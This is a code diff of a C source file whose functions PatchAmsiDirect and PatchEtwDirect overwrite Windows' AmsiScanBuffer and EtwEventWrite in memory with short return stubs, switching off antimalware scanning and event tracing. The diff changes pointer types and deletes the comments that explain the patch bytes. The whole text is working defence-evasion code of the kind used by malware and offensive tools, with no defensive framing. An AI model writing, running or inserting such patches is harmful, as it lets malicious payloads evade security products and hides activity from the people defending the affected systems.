@@ -25,12 +25,9 @@ static BOOL PatchAmsiDirect() {
         if (!hAmsi) return FALSE;
     }
 
-    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
+    void* pAmsiScanBuffer = (void*)GetProcAddress(hAmsi, "AmsiScanBuffer");
     if (!pAmsiScanBuffer) return FALSE;
 
-    // x64: mov eax, 0x80070057; ret
-    // This makes AmsiScanBuffer return E_INVALIDARG, causing the caller
-    // to treat the scan as "nothing to report"
     unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
 
     DWORD oldProtect;
@@ -51,10 +48,9 @@ static BOOL PatchEtwDirect() {
     HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
     if (!hNtdll) return FALSE;
 
-    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
+    void* pEtwEventWrite = (void*)GetProcAddress(hNtdll, "EtwEventWrite");
     if (!pEtwEventWrite) return FALSE;
 
-    // x64: xor eax, eax; ret → returns STATUS_SUCCESS
     unsigned char patch[] = { 0x33, 0xC0, 0xC3 };
 
     DWORD oldProtect;
